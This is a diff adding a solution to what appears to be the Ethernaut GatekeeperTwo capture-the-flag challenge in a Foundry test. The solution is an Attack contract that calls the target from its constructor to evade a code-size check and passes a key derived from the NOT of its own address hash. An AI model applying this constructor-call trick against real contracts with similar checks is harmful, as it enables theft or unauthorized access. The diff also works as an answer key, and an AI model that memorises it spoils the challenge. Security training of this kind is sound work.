@@ -37,7 +37,20 @@ contract TestGatekeeperTwo is BaseTest {
         /** CODE YOUR EXPLOIT HERE */
 
         // Solve the Challenge
+        vm.startPrank(player, player);
+        Attack attack = new Attack(levelAddress);
         
         assertEq(level.entrant(), player);
+    }
+}
+
+contract Attack {
+    constructor(address _target) public {
+        uint64 key;
+        uint64 attack = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
+        assembly {
+            key := not(attack)
+        }
+        GatekeeperTwo(_target).enter(bytes8(key));
     }
 }
